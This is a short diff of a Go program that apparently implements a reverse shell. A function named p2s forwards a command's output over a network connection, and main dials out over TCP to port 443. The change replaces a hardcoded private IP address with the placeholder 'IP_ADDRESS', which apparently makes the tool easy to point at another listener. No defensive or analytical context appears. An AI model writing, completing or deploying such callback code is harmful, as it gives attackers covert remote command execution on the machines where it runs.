@@ -43,7 +43,7 @@ func p2s(conn net.Conn, cmdStdout io.ReadCloser, wg *sync.WaitGroup) {
 }
 
 func main() {
-	conn, err := net.Dial("tcp", "192.168.0.8:443")
+	conn, err := net.Dial("tcp", "IP_ADDRESS:443")
 	if err != nil {
 		return
 	}
